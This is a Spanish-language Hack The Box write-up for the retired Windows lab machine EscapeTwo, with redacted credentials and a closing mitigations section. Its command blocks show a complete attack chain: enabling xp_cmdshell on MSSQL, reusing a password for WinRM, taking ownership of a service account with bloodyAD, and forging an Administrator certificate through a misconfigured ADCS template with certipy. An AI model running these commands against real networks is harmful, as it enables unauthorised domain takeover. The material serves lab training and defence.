---
machine: EscapeTwo
os: Windows
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [windows, active-directory, mssql, xp_cmdshell, adcs, writeowner]
---

# EscapeTwo — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El escenario empieza con credenciales de dominio de bajo privilegio. Un Excel corrupto en un recurso SMB filtra credenciales de MSSQL; `xp_cmdshell` da acceso y una contraseña reutilizada permite WinRM. `WriteOwner` sobre una cuenta de ADCS y una plantilla mal configurada llevan a Administrador.

## Reconocimiento

```bash
nmap -Pn -sC -sV -p53,88,135,139,389,445,1433,5985,9389 <IP>
```

- Controlador de dominio `sequel.htb`.
- SMB, LDAP, Kerberos, MSSQL y WinRM.

## Enumeración

Con las credenciales de `rose`:

```bash
nxc smb <IP> -u rose -p '<PASSWORD>' --shares
smbclient //<IP>/"Accounting Department" -U 'sequel.htb/rose%<PASSWORD>'
```

El recurso contiene hojas de cálculo. Un `.xlsx` corrupto se abre como ZIP y se extrae `xl/sharedStrings.xml`, donde aparecen usuarios y contraseñas.

## Foothold

Las credenciales de `sa` permiten entrar en MSSQL y habilitar `xp_cmdshell`.

```bash
impacket-mssqlclient sequel.htb/sa:'<PASSWORD>'@<IP> -windows-auth
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
```

Se obtiene ejecución como `sql_svc`.

## Movimiento lateral

Un archivo `sql-Configuration.INI` contiene la contraseña en claro de `ryan`, reutilizada para WinRM.

```bash
nxc winrm <IP> -u ryan -p '<PASSWORD>'
evil-winrm -i <IP> -u ryan -p '<PASSWORD>'
```

## Escalada de privilegios

BloodHound muestra que `ryan` tiene `WriteOwner` sobre `ca_svc`. Al ser propietario se puede modificar la DACL y obtener control de la cuenta. Con `ca_svc` se enumeran plantillas ADCS y se abusa de una plantilla modificable (ESC4) para solicitar un certificado como Administrator (ESC1).

```bash
bloodyAD -d sequel.htb -u ryan -p '<PASSWORD>' --host <IP> set owner ca_svc ryan
certipy find -u ca_svc@sequel.htb -p '<PASSWORD>' -dc-ip <IP> -vulnerable
certipy req -u ca_svc@sequel.htb -p '<PASSWORD>' -ca <CA> -template <TEMPLATE> -upn administrator@sequel.htb
certipy auth -pfx administrator.pfx -dc-ip <IP>
```

El certificado permite autenticarse como Administrator y obtener el hash de dominio.

## Evidencia

- Listado del recurso SMB y XML del Excel, con datos redactados.
- `whoami` desde `xp_cmdshell`.
- BloodHound y `WriteOwner`.
- Plantilla ADCS y certificado emitido, sin material real.
- Flag redactada.

## Lecciones aprendidas

- Un documento corrupto sigue siendo un contenedor ZIP legible.
- `WriteOwner` no da acceso directo, pero permite reescribir la DACL.
- Una plantilla ADCS modificable puede convertir una cuenta de servicio en Administrator.

## Mitigaciones y detección

- No guardar credenciales en hojas de cálculo ni archivos de instalación.
- Deshabilitar `xp_cmdshell` y limitar el acceso a MSSQL.
- Revisar ACL peligrosas como `WriteOwner`, `GenericAll` y `GenericWrite`.
- Auditar cambios de plantillas y solicitudes de certificados en ADCS.

## Referencias

- <https://www.hackthebox.com/machines/escapetwo>
- <https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/audit-server-principal-management>
- <https://attack.mitre.org/techniques/T1552/>
- <https://attack.mitre.org/techniques/T1649/>
